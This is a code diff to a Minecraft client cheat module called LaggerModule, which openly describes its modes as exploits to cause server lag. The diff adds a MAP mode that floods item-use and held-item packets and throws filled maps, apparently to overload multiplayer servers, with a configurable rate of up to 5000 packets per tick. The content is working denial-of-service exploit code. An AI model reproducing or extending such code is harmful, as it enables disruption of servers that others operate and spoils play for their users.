@@ -10,6 +10,7 @@ import net.minecraft.client.gui.inventory.GuiContainer;
 import net.minecraft.client.gui.inventory.GuiInventory;
 import net.minecraft.entity.Entity;
 import net.minecraft.init.Items;
+import net.minecraft.inventory.ClickType;
 import net.minecraft.inventory.Container;
 import net.minecraft.item.ItemStack;
 import net.minecraft.nbt.NBTTagCompound;
@@ -32,7 +33,7 @@ public final class LaggerModule extends Module {
     public final Value<Mode> mode = new Value<Mode>("Mode", new String[]{"Mode", "M"}, "Change between various lagger modes, each utilizing a different exploit to cause lag.", Mode.BOXER);
 
     private enum Mode {
-        BOXER, SWAP, MOVEMENT, SIGN, NBT, CONTAINER
+        BOXER, SWAP, MOVEMENT, SIGN, NBT, CONTAINER, MAP
     }
 
     public final Value<Integer> packets = new Value<Integer>("Packets", new String[]{"pckts", "packet"}, "Amount of packets to send each tick while running the chosen lag mode.", 500, 0, 5000, 1);
@@ -114,6 +115,20 @@ public final class LaggerModule extends Module {
                                 mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(tileEntity.getPos(), EnumFacing.DOWN, EnumHand.MAIN_HAND, 0, 0, 0));
                                 mc.player.connection.sendPacket(new CPacketCloseWindow());
                             }
+                        }
+                    }
+                    break;
+                case MAP:
+                    /* made by @sn0wy01 */
+                    mc.player.connection.sendPacket(new CPacketHeldItemChange(1));
+                    mc.player.connection.sendPacket(new CPacketPlayerTryUseItemOnBlock(mc.player.getPosition().down(), EnumFacing.DOWN, EnumHand.MAIN_HAND, 0.0F, 0.0F, 0.0F));
+                    mc.player.connection.sendPacket(new CPacketHeldItemChange(0));
+                    mc.player.connection.sendPacket(new CPacketPlayerTryUseItem(EnumHand.MAIN_HAND));
+
+                    for (int i = 0; i <= 44; ++i) {
+                        if (mc.player.inventoryContainer.getSlot(i).getStack().getItem() == Items.FILLED_MAP) {
+                            mc.playerController.windowClick(mc.player.openContainer.windowId, i, 0, ClickType.THROW, mc.player);
+                            mc.player.inventory.removeStackFromSlot(i);
                         }
                     }
                     break;
